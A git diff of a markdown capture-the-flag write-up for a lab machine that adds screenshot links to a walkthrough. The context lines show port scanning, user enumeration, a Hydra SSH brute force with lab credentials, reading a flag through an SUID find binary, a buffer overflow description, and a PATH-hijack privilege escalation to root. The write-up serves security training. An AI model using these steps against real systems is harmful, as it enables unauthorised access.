@@ -16,7 +16,7 @@ _Hint 1: RID range 1000-1003 Hint 2: The longest username has the unsecure passw
 nmap IP
 ```
 
-[SCREEN01]
+![SCREEN01](https://github.com/user-attachments/assets/22cf3579-364e-4ae8-8ec1-4024491542ca)
 
 2. Enumerate users with `enum4linux`
    - The longest username is **tryhackme**
@@ -25,7 +25,7 @@ nmap IP
 enum4linux IP
 ```
 
-[SCREEN02]
+![SCREEN02](https://github.com/user-attachments/assets/c9171b6b-bdd4-4d30-8e1a-78cd9a17445a)
 
 3. Brute force the SSH password with Hydra
    - The credentials are `tryhackme:thebest`
@@ -34,7 +34,7 @@ enum4linux IP
 hydra -l tryhackme -P /root/Tools/wordlists/rockyou.txt  ssh://IP
 ```
 
-[SCREEN03]
+![SCREEN03](https://github.com/user-attachments/assets/088f93da-aa97-4809-aee8-81a06cba5d5a)
 
 ---
 
@@ -58,7 +58,7 @@ ssh tryhackme@IP
 find / -type f -perm -u=s 2>/dev/null
 ```
 
-[SCREEN04]
+![SCREEN04](https://github.com/user-attachments/assets/5eae1fd2-8909-4789-ad9e-e9cdf32bb4e0)
 
 3. We can use `/usr/bin/find` command to read the flag
 
@@ -66,7 +66,7 @@ find / -type f -perm -u=s 2>/dev/null
 /usr/bin/find /home/des/flag.txt -type f -exec cat {} \;
 ```
 
-[SCREEN05]
+![SCREEN05](https://github.com/user-attachments/assets/11e26c52-8d84-4f83-8576-d8d9ced2a75c)
 
 ---
 
@@ -89,7 +89,7 @@ ls
 cat bof64.c
 ```
 
-[SCREEN06]
+![SCREEN06](https://github.com/user-attachments/assets/a23def57-d0f9-4678-8996-458b9af69adf)
 
 2. This C program contains a buffer overflow vulnerability in the `foo` function. The buffer is 600 bytes, but read can read up to 1000 bytes, allowing for overflow
 
@@ -100,7 +100,7 @@ whoami
 cat /home/kel/flag.txt
 ```
 
-[SCREEN07]
+![SCREEN07](https://github.com/user-attachments/assets/8cd2fc9f-7de7-4927-b660-663c320c07c0)
 
 ---
 
@@ -121,7 +121,7 @@ ls /home/kel
 cat exe.c
 ```
 
-[SCREEN08]
+![SCREEN08](https://github.com/user-attachments/assets/f92c7812-5b3a-4b6a-9b05-ae3e9ae119af)
 
 2. Create a malicious ps script in `/tmp`. Add `/tmp` to the beginning of your PATH. Execute the vulnerable program to get root shell and read the flag
 
@@ -135,4 +135,4 @@ cd /home/kel
 cat /root/root.txt
 ```
 
-[SCREEN09]
+![SCREEN09](https://github.com/user-attachments/assets/79abeda6-01f6-4699-b088-ce9c1946e607)
